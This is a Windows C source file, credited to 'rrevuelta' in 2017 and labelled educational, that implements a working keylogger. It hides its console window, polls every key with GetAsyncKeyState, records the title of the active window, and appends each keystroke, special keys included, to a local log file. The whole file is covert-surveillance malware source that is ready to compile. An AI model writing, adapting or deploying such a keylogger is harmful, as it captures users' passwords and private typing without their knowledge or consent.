/*This program has been written by rrevuelta  2017.
 *
 *This program has been written only for educational porpouse.
*/
#include <stdio.h>
#include <windows.h>

void writeLog(int, FILE *);

int main() {

    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    FILE *log;

    char titleWindow[500];
    int key = 0;

    log=fopen("log.log","a");
    fprintf(log,"\nKeylogger..... STARTED\n");
    fclose(log);

    //Get the focus of the current window
    window = GetForegroundWindow();
    GetWindowText(window,titleWindow,500);
    fprintf(log,"Window: %s", titleWindow);
    fprintf(log,"\n***********************************\n");

    while(1)
    {

        if(window != GetForegroundWindow())
        {
            //Get the focus of the current window
            window = GetForegroundWindow();
            GetWindowText(window,titleWindow,500);

            log=fopen("log.log","a");
            fprintf(log,"\nWindow: %s", titleWindow);
            fprintf(log,"\n***********************************\n");
            fclose(log);
        }

        for(key=4;key<256;key++)
        {
              if (GetAsyncKeyState(key)==-32767)
              {
                    //If the ESC is pressed...
                    if(key==27)
                    {
                        return 0;
                    }

                    writeLog(key, log);
              }
        }
    }

}

/*
 *  Convert to char and write the 'k' key in the log file.
 */
void writeLog(int k, FILE *log) {

    log=fopen("log.log","a");
    char ch;
    switch(k)
    {
        case 8:     //[BACKSPACE]
            fprintf(log,"[BACKSPACE]");
            break;
        case 9:     //[TAB]
            fprintf(log,"[TAB]");
            break;
        case 12:    //[CLEAR]
            fprintf(log,"[CLEAR]");
            break;
        case 13:    //[ENTER]
            fprintf(log,"[ENTER]\n");
            break;
        case 16:    //[SHIFT]
            fprintf(log,"[SHIFT]");
            break;
        case 17:    //[CTRL]
            fprintf(log,"[CTRL]");
            break;
        case 18:    //[ALT]
            fprintf(log,"[ALT]");
            break;
        case 20:    //[CAPS LOCK]
            fprintf(log,"[CAPS LOCK]");
            break;
        case 27:    //[ESC]
            fprintf(log,"[ESC]");
            break;
        case 32:    //[SPACE]
            fprintf(log," ");
            break;
        case 33:    //[PAGE UP]
            fprintf(log,"[PAGE UP]");
            break;
        case 34:    //[PAGE DOWN]
            fprintf(log,"[PAGE DOWN]");
            break;
        case 35:    //[END]
            fprintf(log,"[END]");
            break;
        case 37:    //[LEFT ARROW]
            fprintf(log,"[LEFT ARROW]");
            break;
        case 38:    //[UP ARROW]
            fprintf(log,"[UP ARROW]");
            break;
        case 39:    //[RIGHT ARROW]
            fprintf(log,"[RIGHT ARROW]");
            break;
        case 40:    //[DOWN ARROW]
            fprintf(log,"[DOWN ARROW]");
            break;
        case 46:    //[DEL]
            fprintf(log,"[DEL]");
            break;
        case 91:
            fprintf(log,"[LEFT WINDOWS");
            break;
        case 92:
            fprintf(log,"[RIGHT WINDOWS]");
            break;
        case 96:    //[KEYPAD 0]
            fprintf(log,"[KEYPAD 0]");
            break;
        case 97:    //[KEYPAD 1]
            fprintf(log,"[KEYPAD 1]");
            break;
        case 98:    //[KEYPAD 2]
            fprintf(log,"[KEYPAD 2]");
            break;
        case 99:    //[KEYPAD 3]
            fprintf(log,"[KEYPAD 3]");
            break;
        case 100:    //[KEYPAD 4]
            fprintf(log,"[KEYPAD 4]");
            break;
        case 101:    //[KEYPAD 5]
            fprintf(log,"[KEYPAD 5]");
            break;
        case 102:    //[KEYPAD 6]
            fprintf(log,"[KEYPAD 6]");
            break;
        case 103:    //[KEYPAD 7]
            fprintf(log,"[KEYPAD 7]");
            break;
        case 104:    //[KEYPAD 8]
            fprintf(log,"[KEYPAD 8]");
            break;
        case 105:    //[KEYPAD 9]
            fprintf(log,"[KEYPAD 9]");
            break;
        case 106:   //[MULTIPLY]
            fprintf(log,"[MULTIPLY]");
            break;
        case 107:   //[ADD]
            fprintf(log,"[ADD]");
            break;
        case 108:   //[SEPARATOR]
            fprintf(log,"[SEPARATOR]");
            break;
        case 109:   //[SUBSTRACT]
            fprintf(log,"[SUBSTRACT]");
            break;
        case 110:    //[DECIMAL]
            fprintf(log,"[DECIMAL]");
            break;
        case 111:
            fprintf(log,"[DIVIDE]");
            break;
        case 144:   //[NUM LOCK]
            fprintf(log,"[NUM LOCK]");
            break;
        case 160:   //LEFT SHIFT
            break;
        case 161:   //RIGHT SHIFT
            break;
        case 162:   //L-CTRL
            break;
        case 163:   //R-CTRL
            break;
        case 187:
            fprintf(log,"[+ KEY]");
            break;
        case 188:
            fprintf(log,"[, KEY]");
            break;
        case 189:
            fprintf(log,"[- KEY]");
            break;
        case 190:
            fprintf(log,"[. KEY]");
            break;
        default:
            ch = MapVirtualKey(k,2);
            fprintf(log,"%c" ,ch);

    }
    fclose(log);
}




